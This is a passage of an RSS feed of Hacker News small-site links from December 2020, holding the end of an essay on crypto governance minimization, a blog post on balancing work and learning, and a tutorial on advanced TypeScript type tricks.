system is like designing a perpetual motion device. There are well-known game theoretic results which show all governance systems are both <a href="https://vitalik.ca/general/2020/09/11/coordination.html#understanding-the-game-theory">inherently unstable</a> and <a href="https://en.wikipedia.org/wiki/Arrow%27s_impossibility_theorem">fail to simultaneously satisfy all desirable properties</a>. Formalizing a governance system tends to magnify these inherent issues by reducing the ability for informal governance to solve edge cases as they show up.<br>As a result, the more formal a governance system, the more susceptible it tends to be to capture over a sufficient time horizon. This is primarily because formalizing a governance system requires formalizing stakeholders (who has a say and how much of a say they should have). Formalizing stakeholders is very hard in practice at a single point in time and near impossible over time.</p><p><strong>Tokenholder misalignment<br></strong>Formalizing stakeholders for on-chain governance today typically occurs through simple token ownership and the governance itself through tokenholder voting.  Unfortunately, token holdings are not an accurate reflection of stakeholder value in a protocol for a number of reasons, including:</p><ul data-rte-list="default"><li><p>Not all stakeholders will necessarily be tokenholders, especially users and developers.</p></li><li><p>Token ownership may not accurately reflect a stakeholder's importance to the protocol, present or future. The next Facebook or Google-scale app, when it appears, could be strangled in the cradle by those with higher ownership.</p></li><li><p>Stakeholders change over time. The is especially obvious when considering future stakeholders which don't yet exist. Consider the interests of the mega app which has yet to be created.</p></li></ul><p>As a result, tokenholder voting creates a litany of misalignment issues with the long term use of a protocol, including:</p><ul data-rte-list="default"><li><p><a href="https://vitalik.ca/general/2019/05/09/control_as_liability.html">External pressures</a>. For example, Facebook Inc faced external pressure to lock down developer access to the most detailed social graph in the world (the Facebook platform). Right or wrong, this killed many applications and incalculable numbers of future applications yet to be created.</p></li><li><p>Value capture. Tokenholders may want to capture value for themselves at the expense of others. For example, Twitter monopolized its protocol's UI at the expense of third party developers.</p></li><li><p>Time horizon mismatch. Unlike a protocol, tokenholders have non-infinite time horizons. This may drive them to capture value short term at the expense of the long term use of the protocol. For example, Maker holders with a short term horizon might increase stability fees to generate value short term irrespective of long term impacts. Ironically, Facebook is a good example of the opposite, where Mark Zuckerberg famously refused to display ads (capture value) while the network effect of Facebook was still growing.</p></li><li><p>Outside economic interests. Tokenholders may be large holders of another token and vote with that interest in mind rather than the interests of the protocol being changed. Liquidity mining programs in DeFi are especially vulnerable to this form of misalignment.</p></li></ul><p>Exploits to act on these misalignments are well documented and hard to avoid. Prominent attacks include <a href="https://vitalik.ca/general/2018/03/28/plutocracy.html">buying votes</a> or voting with borrowed tokens — an attack made easier with the invention of flash loans that has <a href="https://www.coindesk.com/flash-loans-manipulate-defi-protocol-elections">already worked</a>!</p><p><strong>Other side effects<br></strong>Even if participants don't explicitly capture a system, governance may still create unintended side effects. For example, formal governance systems can encourage action versus inaction, even when inaction is superior. Governance can also be extremely time and energy consuming.</p><p><strong>Speed of evolution<br></strong>A common argument for on-chain governance is that it can allow protocols to evolve faster. However, there is little, if any, empirical evidence of on-chain governance causing faster protocol evolution. On-chain governance is also extremely nascent, so judging it too heavily is likely premature.<br>What <em>has</em> been demonstrated is the opposite: that rapid evolution can occur without on-chain governance. For example, early Ethereum and Uniswap are protocols that evolved quickly through hard forking alone. This agility can be attributed to a combination of tight knit communities, lower systemic importance, and high levels of trust in core development teams.<br>What about ossification at later stages? Evolution may slow as some combination of network effects, pointer stickiness (protocols becoming embedded in the code of other protocols/applications), and risk aversion set in. Still, if a change is important enough, users and applications can voluntarily opt into it. This usually means a hard or soft fork for a layer-1 protocol and a voluntary migration for layer 2 protocols or application, as seen with the v1 to v2 transitions in protocols like Uniswap, Maker, Compound, and Augur.<br>Ultimately, if a protocol becomes sufficiently inferior to a new alternative, eventually it will be surpassed and die. This is how evolution works in nature. Individual organisms do not evolve (in the genetic code sense). Evolution occurs when copies are made with mutations. This approach has also worked in open source in the past (e.g Linux).<br>Since credible neutrality is the primary value proposition of protocols, erring towards governance minimization over time, even if it means slower evolution at the individual protocol level, will lead to maximal use.</p><p><strong>Governance minimization enables faster ecosystem-wide evolution<br></strong>Most importantly, dependable individual protocols enable faster ecosystem-wide evolution because developers can use these building blocks with confidence. Imagine how much faster development of internet applications would be if every company's code was open source, neutral, and usable by anyone.</p><p><strong>When <em>is</em> governance valuable?<br></strong>Governance is needed where a core mechanism of a protocol requires human input. Human input is needed when a protocol's response to a particular action cannot be known in advance or derived from on-chain data, and thus cannot be coded into the protocol. We refer to these mechanisms as "essential governance".</p><p>Areas of essential governance include:</p><ul data-rte-list="default"><li><p>Consensus itself (e.g. the layer 1 consensus mechanism of Bitcoin or Ethereum). Consensus is governance over which of two otherwise valid histories is valid. This governance is tightly constrained: Bitcoin miners can double-spend and revert history but cannot print unlimited Bitcoin.</p></li><li><p>Oracles. Oracles need some form of human mechanism to decide whether or not their data is valid.</p></li></ul><p>Areas where governance is likely required include:</p><ul data-rte-list="default"><li><p>Treasury management. Governance is likely required for the foreseeable future: deciding how to allocate funds is a hard problem to automate.</p></li><li><p>C…</p></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.fehrsam.xyz/blog/governance-minimization">https://www.fehrsam.xyz/blog/governance-minimization</a></em></p>]]>
            </description>
            <link>https://www.fehrsam.xyz/blog/governance-minimization</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511275</guid>
            <pubDate>Tue, 22 Dec 2020 21:08:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HarmonyOS Overview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511201">thread link</a>) | @ptx
<br/>
December 22, 2020 | https://developer.harmonyos.com/en/docs/documentation/doc-guides/harmonyos-overview-0000000000011903 | <a href="https://web.archive.org/web/*/https://developer.harmonyos.com/en/docs/documentation/doc-guides/harmonyos-overview-0000000000011903">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://developer.harmonyos.com/en/docs/documentation/doc-guides/harmonyos-overview-0000000000011903</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511201</guid>
            <pubDate>Tue, 22 Dec 2020 21:02:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is the Proper Balance Between Working and Learning?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511162">thread link</a>) | @WaitWaitWha
<br/>
December 22, 2020 | https://embeddedartistry.com/blog/2020/11/16/what-is-the-proper-balance-between-working-and-learning/ | <a href="https://web.archive.org/web/*/https://embeddedartistry.com/blog/2020/11/16/what-is-the-proper-balance-between-working-and-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-12228">
		

	
	<div>
		<div><p><strong>Updated:</strong> 20201122</p>
<p>One of our members asked me this question:</p>
<blockquote>
<p>I have started to pick up some freelance work alongside my main job. Now I spend almost the whole day working. I’m starting to feel like I’m missing out on my learning, although doing freelance work has opened up whole new on-the-job learning opportunities. But, I still want to make time to learn additional skills like understanding architecture, designing programs,  and so on.<br>
In your opinion, what is a healthy balance for learning and working?</p>
</blockquote>
<p>I definitely understand this pressure – my time is a mix of consulting, writing for the website, creating courses, raising kids, cooking for the family, gardening, and trying to squeeze in learning time. Whenever things get particularly busy with clients or the website, seemingly extraneous activities like learning are the first thing to drop by the wayside.</p>
<h2>Is This Actually a Problem?</h2>
<p>First, I want to note that I don’t think a temporary suspension of learning is a problem. While we should always be prioritizing our tasks and executing on the current highest priority item, we need to pay particular attention to this prioritize-and-execute strategy when we feel overwhelmed. Focus on the highest priority task, knock it out, and then move on to the next. Extraneous items, which can include learning, can and should fall by the wayside.</p>
<p>However, I do want to note that this kind of workload isn’t really sustainable over long periods of time. We can draw a parallel to the concept of "<a href="https://exrx.net/WeightTraining/Periodization">periodization</a>" in the fitness world, where we drop from a period of intense workouts into a "recovery" period, which allows our muscles and nervous system to recover appropriately. This means that you need to schedule heavier workloads in cycles, making sure to periodically reduce your load (below the typical 40 hours a week!) to recover. If you don’t do this, you will will burn yourself out or become sick. If you choose to cycle your workload in this manner, scheduling learning activities for your "recovery" periods may be the ideal solution, since it is generally quite fun and low stress.</p>
<h2>What’s the Proper Balance?</h2>
<p>Our member’s question was actually about a healthy balance for learning and working. I keep a sticky note on my monitor that says <strong>"20% learning, 80% action."</strong></p>
<p>This reminder is important to me, because I have a tendency to be an "over-learner" who spends time learning things just for the sake of learning. I doubt that I’m alone in this – it seems to be a general tendency among the knowledge workers that I know.</p>
<p>The problem is that “excessive learning” often serves as a distraction, a justification for procrastination, or a cover for the fear you feel when you need to start a project or finally release it for the public to see. There is an infinite amount of information in the universe, but humans are limited and can only possess a small drop in this vast ocean of information. You could spend your whole life learning – but to what end? And are you sure that what you’re learning is contributing a positive return on investment to your life?</p>
<p>We are creatures of action, and in my view, learning should be used to make that action more effective and to reduce the unwanted side effects of our actions. Programming and engineering are fundamentally creative acts. We cannot think or learn our creations into existence. We actually need to take the time build them.</p>
<p>As Dr. Feynman says, there’s a difference between <a href="https://www.youtube.com/watch?v=lFIYKmos3-s">knowing a thing and understanding it</a>. Often, when we’re spending a disproportionate amount of time learning (without actively applying the knowledge), we’re just "learning the names of things" without actually <em>understanding</em> those things.</p>
</div>



<figure><div>

</div></figure><div><p>We need to actively apply what we’ve learned to understand its potential value and to cement the lessons in our minds. We need to reflect on new lessons and techniques in order to find ways to anchor them to what we already know. We need to identify holes in our understanding and work to fill in those holes. We need to evolve beyond what we’ve learned, contributing new ideas and discoveries to the existing body of knowledge. We cannot do any of this without action!</p>
<p>In my opinion, the ultimate form of knowledge for a human is <em>embodied knowledge</em> – knowledge that is so deeply rooted in your being that you can rely on your intuition, muscle memory, and automatic reactions to generate a suitable course of action without requiring significant thought or study. We cannot develop embodied knowledge through "book learning" alone. We need deliberate practice and repetition to achieve this goal.</p>
<h2>How to Fit in Learning Time with a Busy Schedule?</h2>
<p>Beyond an 80/20 split, there are other considerations to keep in mind when we think about fitting continuing education into our schedule.</p>
<p>One important aspect to consider is the <a href="https://en.wikipedia.org/wiki/Spacing_effect">spacing effect</a> and lag effect. Humans learn much better when learning is spread out over time, and we remember things better when we space reviews over longer periods of time instead of shorter periods of time. You will learn more effectively if you set aside 30 minutes per workday instead of 2.5 hours on a Friday afternoon.</p>
<p>We are also creatures of habit. Routines provide structure and consistency to our lives. We are much more likely to stick to a habit that we perform on the same day, at the same time each day, and under the same conditions. This is another reason to set aside a smaller amount of time on a daily basis.</p>
<p>We need to take breaks in order to remain effective. You need to be sure that you are getting up to stretch, walk around, get your blood flowing, and allow your mind to rest. I also strongly recommend <a href="https://embeddedartistry.com/blog/2018/08/02/my-favorite-debugging-tip-get-up-and-take-a-walk/">taking a break whenever you’re stumped by a tricky problem</a>.  I like to spend my breaks walking, doing a quick set of kettlebell swings, or playing some music. You might choose to squeeze in some reading, a podcast, or an audiobook (the latter two being especially suitable for a walk!). Ultimately, the goal is to relax your mind and distract yourself from the problem at hand. However you choose to do that is acceptable.</p>
<blockquote>
<p><strong>Note:</strong> I take a 1 minute break every 20 minutes, and a 15 minute break every two hours. A program on my computer enforces this for me by locking out my screen. You might also choose to use the popular <a href="https://en.wikipedia.org/wiki/Pomodoro_Technique">Pomodoro technique</a>. In this case you would work for 25 minutes and then take a 5 minute break. Every four intervals, you would take a longer 15-30 minute break.</p>
</blockquote>
<p>What happens when it becomes crunch time, and you need to put in the extra effort to complete the project on time or manage an unexpectedly high workload? In these situations, the larger chunks of down time are likely to be sacrificed to squeeze in more work. You can justify keeping smaller, regular blocks of break time in the schedule, especially if you view that block of time as an essential rest.</p>
<p>Some people use a calendar to govern their lives. In this case, carve out time on your calendar for learning and mark yourself as "busy". Ideally, you will schedule this time when you are not likely to give it up for things such as important meetings.</p>
<p>If you work on a team, you could also create a weekly reading club or “lunch-and-learn” sessions. By scheduling continuous education as a group, you build in accountability. Teaching others is also a way to make sure you understand the concepts that you’re teaching. Making sure you understand something well enough to simplify it and explain it to others also helps you cement the knowledge in your mind even further. For the best results, we recommend having a different team member present a paper or topic each week or month (depending on the frequency). We all have our own interests, and cross-pollination can be extremely effective in a team environment.</p>
<blockquote>
<p><strong>Note:</strong> Enterprising employees may also be able to convince their managers to cater a team meal if you schedule the session during lunch time!</p>
</blockquote>
<p>The final strategy I will share is scheduling a “learning” sprint. This works especially well if you’re coming off of a heavy workload and need a mental reset. You can set aside 1–2 weeks to focus on deeply studying a given topic, and then you return to your work well-rested and with new ideas. Often, I will collect interesting books, articles, and lectures for a given topic ahead of time, only scheduling a learning sprint when I reach critical mass in terms of both material and interest/need. Ideally, you will be able to immediately start putting into practice whatever it is you are learning about (otherwise, why are you dedicating so much time to learning it?).</p>
<p>If you find yourself using learning as a form of procrastination, sprints can help you transform that habit. Instead of getting sucked into a learning wormhole, save the articles or books in a digital notebook until you’re able to set aside time to do a deep dive into the subject.</p>
<h2>Do You Really Not Have Time?</h2>
<p>I want to close this article with a question: is it <em>actually true</em> that you don’t have time to learn?</p>
<p>If you are raising a family, caring for a sick or elderly family member, or working multiple jobs, squeezing in time for learning might not make the cut. However, if none of those describe your situation, there’s an extremely high probability that you really do have time.</p>
<p>Imagine I was looking over your shoulder while you went about your day. How often am I going to see you get distracted, open up a news site, browse social media? Am I going to see you binge watching <a aria-describedby="tt" href="https://embeddedartistry.com/fieldmanual-terms/technical-standards-view/" data-cmtooltip="<div class=glossaryItemTitle><span class=&quot;dashicons &quot; data-icon=&quot;&quot; style=&quot;color:#000;display:inline;vertical-align:baseline;&quot;></span>Technical Standards View [TV]</div><div class=glossaryItemBody>DoDAF view. Technical standards view (TV) products define technical standards, implementation conventions, business rules and criteria that govern the architecture.</div>">TV</a> shows or playing video games? This isn’t to say that you shouldn’t be checking in on people, relaxing, or having fun – but are these activities really so much more important than the areas you claim you don’t have time for?</p>
<p>My approach to making everything fit in the schedule involves <a href="https://embeddedartistry.com/blog/2018/06/28/how-i-schedule-my-day-as-a-consultant/#eliminate-distractions">eliminating distractions</a> and <a href="https://embeddedartistry.com/blog/2018/06/28/how-i-schedule-my-day-as-a-consultant/#how-i-structure-my-day">working when I am most effective</a>. But don’t just take it from me. In this video, Jocko Willink describes ways we can squeeze in reading and learning into our busy lives:</p>
</div>



<figure><div>

</div></figure>

	</div>

	 
</article></div>]]>
            </description>
            <link>https://embeddedartistry.com/blog/2020/11/16/what-is-the-proper-balance-between-working-and-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511162</guid>
            <pubDate>Tue, 22 Dec 2020 20:58:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced TypeScript Type Tricks]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25510594">thread link</a>) | @dested
<br/>
December 22, 2020 | https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/ | <a href="https://web.archive.org/web/*/https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
        <div>

            
            <div>

                
                <h3 id="a-journey">A journey</h3>
<p>After spending some time in TypeScript you may begin to crave type safety everywhere in your life. JavaScript is an inherently unsafe language and there are dragons to be found everywhere and in almost every framework. Most frameworks are sufficiently covered, but what if you design a beautiful API internally that needs to be incredibly feature rich, and incredibly safe, but still allow for the best JavaScript idioms. Well at that point you may have to dive into writing some pretty gnarly types.</p>
<p>In general there are a number of TypeScript TYPE libraries out there, <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>, <a href="https://github.com/piotrwitek/utility-types">utility-types</a>, <a href="https://www.npmjs.com/package/type-fest">type-fest</a> to name a few. These libraries are great, and contain a plethora of information, but they are generally sparse in describing HOW they created their utility types.</p>
<blockquote>
<p>There are a lot of great type libraries, but no great documentation on how they’re built</p>
</blockquote>
<p>The goal of this post is to not only expose some great utility types, but also some tips and tricks that I realized along the way. Unfortunately this post requires a relatively strong understanding of TypeScript types and tricks. <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">Advanced Types</a> is a great place to start before diving in!</p>
<h3 id="esoteric-solutions">Esoteric solutions</h3>
<p>A lot of these solutions (and problems) may feel esoteric, and that’s because frankly they are. They are not for the faint of heart, they do not need to be known for daily TypeScript use. They are the nitty-gritty realities of writing type libraries for incredibly complex or il-defined JavaScript problems.</p>
<p>Most of these types come from a few TypeScript libraries im working on, namely <a href="https://www.npmjs.com/package/safe-schema">safe-schema</a>, and <a href="https://www.npmjs.com/package/mongo-safe">mongo-safe</a>, both of which I intend to do lengthy blog posts on in the future.</p>
<p>I have tried to organize these with an example of the usage, and the reason why the problem or solution is novel or interesting. They are in no particular order.</p>
<p>
  <img src="https://casualdeveloper.net/img/youshouldnt.gif" alt="I didnt say they couldnt I said you shouldnt">

</p>
<hr>
<h2 id="setting-a-variable-extends-infer">Setting A Variable (<code>extends infer</code>)</h2>
<h3 id="example">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> {item: <span>Fancy</span>&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>} <span>|</span> 
                Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>, Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>] <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>];
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>extends</span> <span>infer</span> TItem <span>?</span> 
                {item: <span>TItem</span>} <span>|</span> TItem <span>|</span> [TItem, TItem] <span>|</span> [TItem]<span>:</span>
                Impossible;

<span>type</span> Impossible <span>=</span> <span>never</span>;
</code></pre></div>
<h3 id="reason">Reason</h3>
<p>Occasionally you will need to use the same type over and over in your type definition. Every time TypeScript encounters your type it will have to evaluate it again. Using the infer trick you can store a variable in your type that you can use throughout the rest of it.</p>
<p>You will see this <code>extends infer</code> trick pop up in a few places. <code>infer</code> has some interesting properties that make it useful when defining complex types.</p>
<p>Note the use of <code>Impossible</code> here. We can never reach the Impossible branch, so typically we would specify never here, but I have found just putting never there will be confusing in the future when looking at these types again thinking that never branch could possibly be hit. The use of explicit type alias’s that resolve to basic types is a great way to be explicit in your definitions.</p>
<p><em>Note:</em> This will not work if the result of your type is <code>never</code>. If T or <code>Fancy&lt;Shmancy&lt;Deeply&lt;Nested&lt;T&gt;&gt;&gt;&gt;</code> is never, the whole expression will result in <code>never</code>.</p>
<hr>
<h2 id="type-is-never">Type is <code>never</code></h2>
<h3 id="example-1">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>never</span> <span>?</span> 1 : <span>0</span>;

<span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// never
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>never</span>] <span>?</span> 1 : <span>0</span>;
<span>//              ^ ^         ^     ^
</span><span></span><span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// 1
</span></code></pre></div>
<h3 id="reason-1">Reason</h3>
<p>It is not easy to test for <code>never</code>. Once one of the types in your expression is <code>never</code> it will <strong>poison</strong> the rest of the expression to evaluate to <code>never</code>. Typically, this is a useful feature, but when you actually need to check for <code>never</code> you can wrap your expression in a tuple. This will trick the TypeScript compiler to compare apples to apples instead of expanding the <code>never</code>.</p>
<p>It works by comparing the tuple <code>T</code> to the tuple <code>never</code>. We use this tuple trick in a number of places. I am not certain as to why it works, other than the fact that tuples make TypeScript slightly less greedy in its evaluation.</p>
<hr>
<p>
  <img src="https://casualdeveloper.net/img/never.gif" alt="What never? No never.">

</p>
<h2 id="compare-multiple-types-at-once">Compare Multiple Types At Once</h2>
<h3 id="example-2">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> T1 <span>extends</span> {} <span>?</span> 
                              (T2 <span>extends</span> <span>number</span> <span>?</span> 
                                  (T3 <span>extends</span> <span>string</span> <span>?</span> 
                                      1 : 
                                      <span>0</span>)<span>:</span> 
                                  <span>0</span>)<span>:</span> 
                              <span>0</span>;
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> 
                        [
                            T1 <span>extends</span> {} <span>?</span> 1 : <span>0</span>, 
                            T2 <span>extends</span> <span>number</span> <span>?</span> 1 : <span>0</span>, 
                            T3 <span>extends</span> Something <span>?</span> 1 : <span>0</span>
                        ] <span>extends</span> 
                        [<span>1</span>, <span>1</span>, <span>1</span>] <span>?</span> 
                        1:
                        <span>0</span>;
</code></pre></div>
<h3 id="reason-2">Reason</h3>
<p>You will often need to deeply check a few things, and only execute some logic if all are a certain value. This can result in an annoying deeply nested structure.</p>
<p>One clean solution to this is to check all of them upfront in a tuple and compare that to the expected results of each. Now your tree is only one level deep and your intent is much clearer!</p>
<hr>
<h2 id="dont-distribute-my-union">Don’t Distribute My Union</h2>
<h3 id="example-3">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>string</span> <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;

<span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// NO ERROR
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>string</span>] <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;
<span>//                       ^ ^         ^      ^
</span><span></span><span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// ERROR Missing 'b'
</span></code></pre></div>
<h3 id="reason-3">Reason</h3>
<p>Sometimes you will pass a union so deeply that when it reaches its final destination the union has been distributed. This <em>can</em> result in unintended behavior as described above. Since the union has been distributed, <code>value</code> in the first example will result in the type</p>
<pre><code>{thing:
    {[key in 'a']:boolean} | 
    {[key in 'b']:boolean} | 
    {[key in 'c']:boolean}
}
</code></pre><p>when your goal was simply <code>{thing: {[key in ('a'|'b'|'c')]:boolean} }</code>.</p>
<p>The solution to this is to wrap <code>T</code> in a tuple to force TypeScript to not distribute your union in subsequent expressions.</p>
<hr>
<h2 id="exclude-never">Exclude <code>never</code></h2>
<h3 id="example-4">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Bad <span>=</span> {shoes:<span>never</span>; other: <span>boolean</span>}
<span>const</span> value: <span>Bad</span> <span>=</span> {shoes:<span>1</span>, other:<span>true</span>};  <span>// throws an error on shoes but intellisense and type is misleading
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span>
<span>export</span> <span>type</span> ExcludeNever&lt;<span>T</span>&gt; <span>=</span> {
    [key <span>in</span> <span>keyof</span> T <span>as</span> T[key] <span>extends</span> <span>never</span> <span>?</span> <span>never</span> <span>:</span> key]<span>:</span> T[key];
};


<span>const</span> value: <span>ExcludeNever</span>&lt;<span>Bad</span>&gt; <span>=</span> {shoes: <span>1</span>, other: <span>true</span>} <span>// throws a full error and no intellisense
</span></code></pre></div>
<h3 id="reason-4">Reason</h3>
<p>Occasionally you will process some type in a <code>Record</code> and set a value to never. This is perfectly valid and will throw errors when the user attempts to put a value there.</p>
<p>The problem is, intellisense does not exclude this key from your result list. Sure the type is <code>never</code>, but since the key still exists it will allow you to put a value there.</p>
<p>The solution is to use the new TypeScript <code>as</code> syntax to set the key to <code>never</code> when appropriate, that way it will not be available to the user.</p>
<p>Note: the end result is the same, you cannot put a value for shoes, but the DX is significantly improved in the second case.</p>
<hr>
<h2 id="potential-solution-to-type-instantiation-is-excessively-deep-and-possibly-infinite">Potential Solution To <code>type instantiation is excessively deep and possibly infinite</code></h2>
<h3 id="example-5">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> <span>/*...*/</span> GoDeep&lt;<span>T</span>&gt;; 
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>infer</span> R <span>?</span> <span>/*...*/</span> GoDeep&lt;<span>R</span>&gt; <span>:</span> Impossible;
</code></pre></div>
<h3 id="reason-5">Reason</h3>
<p>Now this one is a bit hard to explain, but easily one of the most powerful tricks in this post. It has saved my bacon too many times to count.</p>
<p>The example above is intentionally sparse since it’s hard to find real world examples. <em>When you need it, you’ll know</em>.</p>
<p>Along your journey to making a complex library completely typesafe you will inevitably create a type that is <em>potentially</em> infinitely deeply nested.</p>
<p>A little background: TypeScript has a rule that it will generally not dive deeper than about 50 levels of type checking before it throws up its hands and resolves the dreaded “type instantiation is excessively deep and possibly infinite”. This means your type is too complex and it would take too long to evaluate, so it wont.</p>
<p>I will say that 90% of the time this is due to an issue in your code that is solvable without use of trickery. Typically, you screwed up somewhere. However, on the rare occasion where you did everything right, your type is properly optimized, but your library requirements actually do push the envelope, you can use the above trick.</p>
<p>How it works is still a bit of a mystery to me. This is a trick I learned from the incredible library <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>. The best I can tell is it <strong>defers</strong> the evaluation of the type T until it is actually requested. What this means is just because your type <strong>can</strong> be nested infinitely, this outcome will be tested <strong>based on usage</strong> rather than a blanket statement.</p>
<p>That means if you pass a T that does exhaust the 50 cap then TypeScript will be sure to let you know, but until then all of the T’s that play nice will continue to work.</p>
<p>I dont know if the explanation above is correct and would love to be corrected! In my experience and research this is how it works.</p>
<p>
  <img src="https://casualdeveloper.net/img/deep.gif" alt="Deep">

</p>
<hr>
<h2 id="potential-solution-to-excessive-union">Potential Solution To <code>excessive union</code></h2>
<h3 id="example-6">Example</h3>
<div><pre><code data-lang="typescript"><span>type</span> Depths <span>=</span> <span>1</span> <span>|</span> <span>2</span> <span>|</span> <span>3</span> <span>|</span> <span>4</span> <span>|</span> <span>5</span>;

<span>type</span> NextDepth&lt;<span>TDepth</span> <span>extends</span> <span>Depths</span>&gt; <span>=</span> TDepth <span>extends</span> <span>1</span>
  <span>?</span> 2
  : <span>TDepth</span> <span>extends</span> <span>2</span>
  <span>?</span> 3
  : <span>TDepth</span> <span>extends</span> <span>3</span>
  <span>?</span> 4
  : <span>TDepth</span> <span>extends</span> <span>4</span>
  <span>?</span> 5
  : <span>never</span>;

<span>export</span> <span>type</span> SafeTypes <span>=</span> <span>number</span> <span>|</span> <span>string</span> <span>|</span> <span>boolean</span> <span>|</span> <span>Date</span>

<span>export</span> <span>type</span> DeepKeys&lt;<span>T</span> <span>extends</span> {}, <span>TDepth</span> <span>extends</span> <span>Depths </span><span>=</span> <span>1</span>&gt; <span>=</span> TDepth <span>extends</span> <span>5</span>
  <span>?</span> <span>//                                                           ^^ here is the check …</span></code></pre></div></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</a></em></p>]]>
            </description>
            <link>https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25510594</guid>
            <pubDate>Tue, 22 Dec 2020 20:08:43 GMT</pubDate>
        </item>
        <item>
            <title>
